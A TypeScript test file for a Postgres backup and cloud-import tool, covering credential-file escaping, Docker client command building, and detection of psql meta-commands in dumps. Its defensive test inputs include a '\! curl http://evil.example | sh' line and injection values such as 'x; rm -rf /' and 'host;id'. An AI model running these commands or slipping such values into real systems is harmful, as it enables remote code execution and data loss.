import { describe, expect, it } from "vitest";
import { redactor } from "#/server/services/backup/rclone.ts";
import {
	bucketCopyArgs,
	clientImage,
	copyLogSummaryCommand,
	dataDumpCheckCommand,
	errorLinesCommand,
	findMetaCommand,
	type PgEndpoint,
	parseErrorLines,
	parseFreeDisk,
	parseRowCounts,
	pgClientCommand,
	pgpassFile,
	pgServiceFile,
	prepareSyncWorkDirCommand,
	restoreArgv,
	rowCountsSql,
	writeContainerFileCommand,
} from "./commands";

const PASSWORD = "s3cr:et\\pass";
const cloud: PgEndpoint = {
	host: "aws-1-eu-central-1.pooler.supabase.com",
	hostaddr: "3.65.1.2",
	port: 5432,
	user: "postgres.abcdefghijklmnopqrst",
	dbname: "postgres",
	sslmode: "verify-full",
	sslrootcert: "/secrets/root.crt",
	password: PASSWORD,
};
const local: PgEndpoint = {
	host: "127.0.0.1",
	port: 5432,
	user: "supabase_admin",
	dbname: "postgres",
	sslmode: "disable",
	password: "local-pass",
};
const WORK = "/etc/nitrobase/backup-work/cloud-import-abc";

describe("libpq credential files", () => {
	it("writes services without passwords, pinned to the checked address", () => {
		const file = pgServiceFile({ cloud, local });
		expect(file).toContain(
			"[cloud]\nhost=aws-1-eu-central-1.pooler.supabase.com\nhostaddr=3.65.1.2\n",
		);
		expect(file).toContain(
			"sslmode=verify-full\nsslrootcert=/secrets/root.crt",
		);
		expect(file).toContain("[local]\nhost=127.0.0.1\nport=5432");
		expect(file).not.toContain(PASSWORD);
		expect(file).not.toContain("local-pass");
	});

	it("escapes pgpass fields", () => {
		expect(pgpassFile([cloud])).toBe(
			"aws-1-eu-central-1.pooler.supabase.com:5432:postgres:postgres.abcdefghijklmnopqrst:s3cr\\:et\\\\pass\n",
		);
	});

	it("refuses multi-line values", () => {
		expect(() => pgpassFile([{ ...cloud, password: "a\nb" }])).toThrow();
		expect(() =>
			pgServiceFile({ cloud: { ...cloud, host: "x\n[evil]" } }),
		).toThrow();
	});
});

describe("client container", () => {
	it("mounts the credentials read-only and never puts secrets in argv", () => {
		const command = pgClientCommand({
			image: "postgres:17.6-alpine",
			workDir: WORK,
			mode: "dump",
			argv: ["pg_dump", "--schema-only", "-f", "/dump/schema.sql"],
		});
		expect(command).toBe(
			`docker run --rm -i --init -v '${WORK}/secrets:/secrets:ro' -v '${WORK}/dump:/dump' -e PGSERVICEFILE=/secrets/pg_service.conf -e PGPASSFILE=/secrets/pgpass -e PGSERVICE=cloud 'postgres:17.6-alpine' 'pg_dump' '--schema-only' '-f' '/dump/schema.sql'`,
		);
		expect(command).not.toContain(PASSWORD);
	});

	it("loads inside the app database's network namespace with its credentials only", () => {
		const command = pgClientCommand({
			image: "postgres:17.6-alpine",
			workDir: WORK,
			mode: "load",
			network: "container:app-supabase-db-1",
			argv: restoreArgv(["roles.sql", "schema.sql", "data.sql"]),
			stderrFile: `${WORK}/logs/restore.err`,
		});
		expect(command).toContain("--network 'container:app-supabase-db-1'");
		// The load-only folder: no cloud password can be read there.
		expect(command).toContain(`-v '${WORK}/secrets-load:/secrets:ro'`);
		expect(command).not.toContain(`'${WORK}/secrets:`);
		expect(command).toContain("-e PGSERVICE=local");
		expect(command).toContain(`-v '${WORK}/dump:/dump:ro'`);
		expect(command.endsWith(`2> '${WORK}/logs/restore.err'`)).toBe(true);
	});

	it("only runs Postgres clients with valid images and networks", () => {
		const base = {
			image: "postgres:17.6-alpine",
			workDir: WORK,
			mode: "dump" as const,
			argv: ["psql"],
		};
		expect(() =>
			pgClientCommand({ ...base, argv: ["sh", "-c", "id"] }),
		).toThrow();
		expect(() => pgClientCommand({ ...base, image: "x; rm -rf /" })).toThrow();
		expect(() => pgClientCommand({ ...base, network: "host;id" })).toThrow();
	});

	it("loads roles, schema, then data with triggers off, then vault", () => {
		expect(
			restoreArgv(["roles.sql", "schema.sql", "data.sql", "vault.sql"]),
		).toEqual([
			"psql",
			"-X",
			"-q",
			"-v",
			"ON_ERROR_STOP=0",
			"-f",
			"/dump/roles.sql",
			"-f",
			"/dump/schema.sql",
			"-c",
			"SET session_replication_role = replica",
			"-f",
			"/dump/data.sql",
			"-f",
			"/dump/vault.sql",
		]);
	});

	it("picks the pinned client image of a major version", () => {
		const images = { "17": "postgres:17.6-alpine", "16": "bad image" };
		expect(clientImage(images, 17)).toBe("postgres:17.6-alpine");
		expect(clientImage(images, 16)).toBeNull();
		expect(clientImage(images, 15)).toBeNull();
		expect(() => clientImage(images, 3)).toThrow();
	});

	it("pins every default major to a release with the \\restrict fix", async () => {
		const { loadConfig } = await import("#/config/server.ts");
		const images = loadConfig(
			{} as NodeJS.ProcessEnv,
		).CLOUD_SYNC_PG_CLIENT_IMAGES;
		const fixed: Record<string, number> = {
			13: 22,
			14: 19,
			15: 14,
			16: 10,
			17: 6,
			18: 0,
		};
		for (const [major, minor] of Object.entries(fixed)) {
			const tag = /^postgres:(\d+)\.(\d+)-alpine$/.exec(images[major] ?? "");
			expect(tag?.[1], major).toBe(major);
			expect(Number(tag?.[2])).toBeGreaterThanOrEqual(minor);
		}
	});
});

describe("dump safety (psql meta-commands)", () => {
	it("finds a meta-command outside literals in a small dump", () => {
		expect(
			findMetaCommand(
				'CREATE TABLE "t" (id int);\n\\! curl http://evil.example | sh\n',
			),
		).toBe(2);
		expect(findMetaCommand("SELECT 1; \\o /tmp/x\n")).toBe(1);
	});

	it("allows backslashes in strings, quoted names, bodies, comments and COPY data", () => {
		const dump = [
			"\\restrict abc123",
			"CREATE FUNCTION f() RETURNS text LANGUAGE plpgsql AS $_$",
			"BEGIN RETURN regexp_replace('a', '\\d+', ''); END",
			"$_$;",
			"COMMENT ON TABLE t IS E'line\\nbreak \\' quote';",
			"SELECT 'plain \\ backslash';",
			'CREATE TABLE "we\\ird" (x int); -- comment \\! nope',
			"/* block \\! nope */",
			'COPY "public"."t" ("x") FROM stdin;',
			"\\! not a command: COPY data",
			"\\.",
			"\\unrestrict abc123",
		].join("\n");
		expect(findMetaCommand(dump)).toBeNull();
	});

	it("checks large data dumps on the server with awk", async () => {
		const { mkdtempSync, writeFileSync } = await import("node:fs");
		const { execSync } = await import("node:child_process");
		const dir = mkdtempSync("/tmp/cs-dump-check-");
		const check = (text: string) => {
			writeFileSync(`${dir}/data.sql`, text);
			try {
				execSync(dataDumpCheckCommand(`${dir}/data.sql`), { stdio: "pipe" });
				return { code: 0, out: "" };
			} catch (error) {
				const failed = error as { status: number; stdout: Buffer };
				return { code: failed.status, out: failed.stdout.toString().trim() };
			}
		};
		const ok = [
			"\\restrict k1",
			"SET statement_timeout = 0;",
			'COPY "public"."t" ("x") FROM stdin;',
			"a\\tb\\\\c",
			"\\! inside data",
			"\\.",
			'SELECT pg_catalog.setval(\'"public"."t_id_seq"\', 3, true);',
			"\\unrestrict k1",
		].join("\n");
		expect(check(ok)).toEqual({ code: 0, out: "" });
		expect(check(`${ok}\n\\! curl http://evil.example | sh\n`)).toEqual({
			code: 3,
			out: "9",
		});
		expect(check('COPY "t" ("x") FROM stdin;\nrow\n').code).toBe(4);
	});
});

describe("helpers", () => {
	it("prepares a private staging layout", () => {
		expect(prepareSyncWorkDirCommand(WORK)).toBe(
			`umask 077 && mkdir -p '${WORK}/secrets' '${WORK}/secrets-load' '${WORK}/secrets-rclone' '${WORK}/dump' '${WORK}/logs'`,
		);
	});

	it("writes the root key from stdin as the database user", () => {
		expect(
			writeContainerFileCommand(
				"app-db-1",
				"/etc/postgresql-custom/pgsodium_root.key",
				"postgres",
			),
		).toBe(
			`docker exec -i -u 'postgres' 'app-db-1' sh -c 'umask 077 && cat > "$1"' sh '/etc/postgresql-custom/pgsodium_root.key'`,
		);
		expect(() =>
			writeContainerFileCommand("app-db-1", "/etc/../x", "postgres"),
		).toThrow();
	});

	it("parses free disk, error lines and row counts", () => {
		expect(parseFreeDisk("/dev/sda1 1000 200 800 20% /")).toBe(800 * 1024);
		expect(parseFreeDisk("")).toBeNull();
		expect(parseErrorLines("3\npsql:/dump/data.sql:1: ERROR:  x\n")).toEqual({
			count: 3,
			lines: ["psql:/dump/data.sql:1: ERROR:  x"],
		});
		expect(parseRowCounts("public.todos|12\nauth.users|3\nbad line\n")).toEqual(
			new Map([
				["public.todos", 12],
				["auth.users", 3],
			]),
		);
		expect(errorLinesCommand("/w/e", 5)).toContain("head -n 5");
		expect(copyLogSummaryCommand("/w/l", 5)).toContain("': Copied'");
	});

	it("counts rows of user schemas plus listed tables with quoted literals", () => {
		const sql = rowCountsSql(["public", "o'neil"], ["auth.users"], 100);
		expect(sql).toContain("ARRAY[E'public', E'o''neil']::text[]");
		expect(sql).toContain("ARRAY[E'auth.users']::text[]");
		expect(sql).toContain("limit 100");
	});

	it("copies buckets without trusting the destination listing", () => {
		const args = bucketCopyArgs("avatars", 4, "/work/logs/x.log");
		expect(args.slice(0, 4)).toEqual([
			"copy",
			"cloud:avatars",
			"local:avatars",
			"--no-check-dest",
		]);
	});

	it("redaction scrubs credentials from output", () => {
		const redact = redactor([PASSWORD, "a".repeat(64)]);
		expect(redact(`failed: ${PASSWORD} key=${"a".repeat(64)}`)).toBe(
			"failed: [redacted] key=[redacted]",
		);
	});
});
